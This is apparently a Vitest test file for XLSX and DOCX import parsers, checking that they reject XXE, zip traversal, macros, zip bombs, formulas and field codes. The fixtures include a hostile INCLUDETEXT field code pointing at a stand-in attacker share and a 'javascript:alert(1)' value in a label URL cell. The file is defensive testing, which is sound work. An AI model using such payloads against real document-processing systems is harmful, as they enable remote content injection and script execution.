import { describe, expect, it } from "vitest";
import { ImportParseError, parseImportFile, toFileNameOnly } from "./index";
import { parseIngredientCell } from "./normalize";
import { parseDocx } from "./docx";
import { parseXlsx } from "./xlsx";
import { decodeXmlText, scanXml } from "./xml";
import { ZipReader } from "./zip";
import {
  buildDocx,
  buildFormulaXlsx,
  buildMacroXlsx,
  buildRatioBombXlsx,
  buildTraversalZip,
  buildXlsx,
  buildXxeXlsx,
  buildZip,
} from "./test-fixtures";

/**
 * The parsers, and what they refuse.
 *
 * The refusal tests are the ones that matter. A parser that reads a good file
 * correctly is table stakes; a parser pointed at a file the practitioner
 * received from someone else has to be judged on the bad ones.
 */

const PRODUCT_SHEET = [
  ["Practitioner product list — updated August", null, null],
  ["Product Name", "Manufacturer", "Item #", "Serving", "Label URL", "Margin %"],
  ["Magnesium Glycinate", "Acme Labs", "AC-100", "2 capsules", "https://example.invalid/mag", "42"],
  ["Curcumin Complex", "Acme Labs", "AC-200", "1 capsule", "https://example.invalid/cur", "38"],
  ["", "Acme Labs", "AC-300", "", "", ""],
];

describe("the XML reader", () => {
  it("refuses a DOCTYPE outright, wherever it appears", () => {
    expect(() => scanXml("<a/><!DOCTYPE x>", {})).toThrow(ImportParseError);
    expect(() => scanXml('<!DOCTYPE x [ <!ENTITY e "v"> ]><a/>', {})).toThrow(/document-type/i);
  });

  it("refuses an entity declaration on its own", () => {
    expect(() => scanXml('<a><!ENTITY e "v"></a>', {})).toThrow(/entities/i);
  });

  it("leaves an unknown entity reference verbatim rather than resolving it", () => {
    // Resolving would mean inventing a value the source never stated.
    expect(decodeXmlText("Vitamin&nbsp;D")).toBe("Vitamin&nbsp;D");
    expect(decodeXmlText("a &amp; b")).toBe("a & b");
    expect(decodeXmlText("&#65;&#x42;")).toBe("AB");
  });

  it("never expands a numeric reference beyond one code point", () => {
    expect(decodeXmlText("&#99999999999;")).toBe("&#99999999999;");
    expect(decodeXmlText("&#xD800;")).toBe("&#xD800;");
  });

  it("refuses XML nested past the depth limit", () => {
    const deep = "<a>".repeat(200) + "</a>".repeat(200);
    expect(() => scanXml(deep, {})).toThrow(/levels deep/i);
  });

  it("does not mistake comment or CDATA contents for markup", () => {
    const seen: string[] = [];
    scanXml("<r><!-- <fake/> --><![CDATA[<not a tag>]]></r>", {
      onOpen: (tag) => seen.push(`open:${tag.name}`),
      onText: (text) => seen.push(`text:${text}`),
    });
    expect(seen).toEqual(["open:r", "text:<not a tag>"]);
  });
});

describe("the ZIP reader", () => {
  it("refuses an entry whose path escapes the container", () => {
    expect(() => new ZipReader(buildTraversalZip())).toThrow(/escape the document/i);
  });

  it("refuses a macro project by name, before decompressing anything", () => {
    expect(() => new ZipReader(buildMacroXlsx())).toThrow(/VBA macro project/i);
  });

  it("refuses an entry that expands beyond the ratio ceiling", () => {
    expect(() => new ZipReader(buildRatioBombXlsx())).toThrow(/expands more than/i);
  });

  it("reads the central directory, and a duplicate name does not shadow the first", () => {
    const zip = new ZipReader(
      buildZip([
        { name: "a.xml", data: Buffer.from("<first/>") },
        { name: "a.xml", data: Buffer.from("<second/>") },
      ]),
    );
    expect(zip.readText("a.xml")).toBe("<first/>");
  });

  it("returns null for an entry that is not present", () => {
    const zip = new ZipReader(buildZip([{ name: "a.xml", data: Buffer.from("<a/>") }]));
    expect(zip.readText("missing.xml")).toBeNull();
  });
});

describe("the XLSX parser", () => {
  it("reads values, sheet names and 1-based row numbers", () => {
    const workbook = parseXlsx(buildXlsx([{ name: "Products", rows: PRODUCT_SHEET }]));
    expect(workbook.sheets).toHaveLength(1);
    expect(workbook.sheets[0].name).toBe("Products");
    const row = workbook.sheets[0].rows.find((r) => r.rowNumber === 3);
    expect(row?.cells.map((c) => c.value)).toEqual([
      "Magnesium Glycinate",
      "Acme Labs",
      "AC-100",
      "2 capsules",
      "https://example.invalid/mag",
      "42",
    ]);
  });

  it("takes a formula's CACHED VALUE and never the formula", () => {
    const workbook = parseXlsx(buildFormulaXlsx());
    const values = workbook.sheets[0].rows.flatMap((r) => r.cells.map((c) => c.value));
    expect(values).toContain("Cached Brand");
    expect(values.join(" ")).not.toContain("WEBSERVICE");
    expect(values.join(" ")).not.toContain("attacker.invalid");
  });

  it("reports an uncalculated formula as empty rather than guessing", () => {
    const workbook = parseXlsx(buildFormulaXlsx());
    expect(workbook.uncachedFormulaCells).toBe(1);
  });

  it("does not read external links or the calculation chain", () => {
    const workbook = parseXlsx(buildFormulaXlsx());
    expect(workbook.ignoredParts).toContain("xl/externalLinks/externalLink1.xml");
    expect(workbook.ignoredParts).toContain("xl/calcChain.xml");
  });

  it("refuses a sheet carrying an XXE payload", () => {
    expect(() => parseXlsx(buildXxeXlsx())).toThrow(/document-type/i);
  });

  it("refuses a file that is not a workbook at all", () => {
    expect(() => parseXlsx(buildDocx([{ text: "Hello" }]))).toThrow(/not an \.xlsx/i);
  });
});

describe("the DOCX parser", () => {
  const DOC = [
    { text: "Thyroid support", heading: 1 },
    { text: "First-line considerations for hypothyroid presentations.", heading: undefined },
    { text: "Monitoring", heading: 2 },
    { text: "Recheck TSH at eight weeks.", heading: undefined },
    { text: "INCLUDETEXT \\\\attacker.invalid\\share\\payload.docx", fieldCode: true },
    { text: "This sentence was struck out by the author.", deleted: true },
  ];

  it("keeps text and the heading trail above it", () => {
    const doc = parseDocx(buildDocx(DOC));
    const monitoring = doc.paragraphs.find((p) => p.text.startsWith("Recheck TSH"));
    expect(monitoring?.sectionPath).toEqual(["Thyroid support", "Monitoring"]);
  });

  it("discards field codes and never stores the instruction", () => {
    const doc = parseDocx(buildDocx(DOC));
    expect(doc.discardedFieldCodes).toBe(1);
    expect(doc.paragraphs.map((p) => p.text).join(" ")).not.toContain("INCLUDETEXT");
    expect(doc.paragraphs.map((p) => p.text).join(" ")).not.toContain("attacker.invalid");
  });

  it("drops text the author struck out", () => {
    const doc = parseDocx(buildDocx(DOC));
    expect(doc.paragraphs.map((p) => p.text).join(" ")).not.toContain("struck out");
  });

  it("refuses a file that is not a document at all", () => {
    expect(() => parseDocx(buildXlsx([{ name: "S", rows: [["a"]] }]))).toThrow(/not a \.docx/i);
  });
});

describe("the ingredient cell parser", () => {
  it("takes an amount only when the cell states one", () => {
    expect(parseIngredientCell("Magnesium 200 mg, Glycine 100 mg")).toEqual([
      { name: "Magnesium", amount: "200", unit: "mg" },
      { name: "Glycine", amount: "100", unit: "mg" },
    ]);
  });

  it("never guesses an amount for a part that does not state one", () => {
    // "a proprietary blend" has no dose, and the parser must not invent one.
    expect(parseIngredientCell("Vitamin D3 1000 IU; proprietary blend")).toEqual([
      { name: "Vitamin D3", amount: "1000", unit: "iu" },
      { name: "proprietary blend" },
    ]);
  });

  it("returns nothing for an empty cell rather than an empty-named entry", () => {
    expect(parseIngredientCell("  ,  ; ")).toEqual([]);
  });
});

describe("parseImportFile — the envelope", () => {
  const bytes = buildXlsx([{ name: "Products", rows: PRODUCT_SHEET }]);

  it("finds the header row below a title banner", () => {
    const envelope = parseImportFile({
      bytes,
      filename: "products.xlsx",
      sourceKind: "product_spreadsheet",
    });
    expect(envelope.items).toHaveLength(2);
    expect(envelope.items[0].payload.name).toBe("Magnesium Glycinate");
    expect(envelope.items[0].payload.sku).toBe("AC-100");
  });

  it("keeps the verbatim row beside the normalised payload", () => {
    const envelope = parseImportFile({
      bytes,
      filename: "products.xlsx",
      sourceKind: "product_spreadsheet",
    });
    expect(envelope.items[0].sourceRaw["Product Name"]).toBe("Magnesium Glycinate");
    // The unmapped column survives in the raw record and nowhere else.
    expect(envelope.items[0].sourceRaw["Margin %"]).toBe("42");
    expect(Object.keys(envelope.items[0].payload)).not.toContain("Margin %");
  });

  it("reports an unrecognised column rather than dropping it silently", () => {
    const envelope = parseImportFile({
      bytes,
      filename: "products.xlsx",
      sourceKind: "product_spreadsheet",
    });
    expect(envelope.report.unmappedColumns).toContain("Margin %");
  });

  it("names the sheet and row a row came from", () => {
    const envelope = parseImportFile({
      bytes,
      filename: "products.xlsx",
      sourceKind: "product_spreadsheet",
    });
    expect(envelope.items[0].sourceSheet).toBe("Products");
    expect(envelope.items[0].externalKey).toBe("Products:3");
  });

  it("skips a row with no product name and says why", () => {
    const envelope = parseImportFile({
      bytes,
      filename: "products.xlsx",
      sourceKind: "product_spreadsheet",
    });
    expect(envelope.report.skippedRows).toHaveLength(1);
    expect(envelope.report.skippedRows[0].rowNumber).toBe(5);
    expect(envelope.report.skippedRows[0].why).toMatch(/no product name/i);
  });

  it("never emits a key for a field the source did not supply", () => {
    const envelope = parseImportFile({
      bytes,
      filename: "products.xlsx",
      sourceKind: "product_spreadsheet",
    });
    // The sheet has no form, category or regulatory column at all.
    expect(Object.keys(envelope.items[0].payload)).not.toContain("form");
    expect(Object.keys(envelope.items[0].payload)).not.toContain("regulatoryClassification");
  });

  it("hashes the file exactly as supplied", () => {
    const a = parseImportFile({ bytes, filename: "a.xlsx", sourceKind: "product_spreadsheet" });
    const b = parseImportFile({ bytes, filename: "b.xlsx", sourceKind: "product_spreadsheet" });
    expect(a.sourceSha256).toBe(b.sourceSha256);
    expect(a.sourceSha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it("strips any path, keeping only the file name", () => {
    const envelope = parseImportFile({
      bytes,
      filename: "/Users/practitioner/Clinical/Private/products.xlsx",
      sourceKind: "product_spreadsheet",
    });
    expect(envelope.sourceFilename).toBe("products.xlsx");
    expect(JSON.stringify(envelope)).not.toContain("/Users/");
  });

  it("strips a Windows drive and backslash path too", () => {
    expect(toFileNameOnly("C:\\Users\\me\\Desktop\\list.xlsx")).toBe("list.xlsx");
    expect(toFileNameOnly("products.xlsx")).toBe("products.xlsx");
  });

  it("refuses a non-URL in the label field but keeps the cell in the raw record", () => {
    const hostile = buildXlsx([
      {
        name: "Products",
        rows: [
          ["Product Name", "Manufacturer", "Item #", "Label URL"],
          ["Probe", "Acme", "AC-9", "javascript:alert(1)"],
        ],
      },
    ]);
    const envelope = parseImportFile({
      bytes: hostile,
      filename: "p.xlsx",
      sourceKind: "product_spreadsheet",
    });
    expect(envelope.items[0].payload.sourceUrl).toBeUndefined();
    expect(envelope.items[0].sourceRaw["Label URL"]).toBe("javascript:alert(1)");
  });

  it("refuses a file whose bytes are not an Office container", () => {
    expect(() =>
      parseImportFile({
        bytes: Buffer.from("name,brand\nA,B\n"),
        filename: "products.xlsx",
        sourceKind: "product_spreadsheet",
      }),
    ).toThrow(/not an \.xlsx or \.docx/i);
  });

  it("names the older format specifically rather than saying 'unreadable'", () => {
    const ole2 = Buffer.concat([
      Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
      Buffer.alloc(64),
    ]);
    expect(() =>
      parseImportFile({ bytes: ole2, filename: "old.xls", sourceKind: "product_spreadsheet" }),
    ).toThrow(/older Office format/i);
  });

  it("refuses an empty file", () => {
    expect(() =>
      parseImportFile({
        bytes: Buffer.alloc(0),
        filename: "empty.xlsx",
        sourceKind: "product_spreadsheet",
      }),
    ).toThrow(/empty/i);
  });

  it("captures document sections as references, never as protocols with doses", () => {
    const envelope = parseImportFile({
      bytes: buildDocx([
        { text: "Thyroid support", heading: 1 },
        { text: "Start levothyroxine 50 mcg daily and recheck at eight weeks.", heading: undefined },
      ]),
      filename: "protocols.docx",
      sourceKind: "protocol_document",
    });
    expect(envelope.items).toHaveLength(1);
    expect(envelope.items[0].entityType).toBe("knowledge_reference");
    // The prose mentions a dose. Nothing in the payload claims one.
    expect(Object.keys(envelope.items[0].payload)).not.toContain("dose");
    expect(Object.keys(envelope.items[0].payload)).not.toContain("servingSize");
    expect(envelope.report.notices.join(" ")).toMatch(/No dose, protocol or clinical claim/i);
  });

  it("keeps the full section text in the raw record while the excerpt is capped", () => {
    const long = "x".repeat(600);
    const envelope = parseImportFile({
      bytes: buildDocx([
        { text: "Section", heading: 1 },
        { text: long, heading: undefined },
      ]),
      filename: "protocols.docx",
      sourceKind: "protocol_document",
    });
    expect(String(envelope.items[0].payload.shortExcerpt)).toHaveLength(300);
    expect(String(envelope.items[0].sourceRaw.body)).toHaveLength(600);
  });

  it("says a document with no headings could not be divided, and imports nothing", () => {
    const envelope = parseImportFile({
      bytes: buildDocx([{ text: "One long unstructured note." }]),
      filename: "notes.docx",
      sourceKind: "protocol_document",
    });
    expect(envelope.items).toHaveLength(0);
    expect(envelope.report.skippedRows[0].why).toMatch(/no headings/i);
  });
});
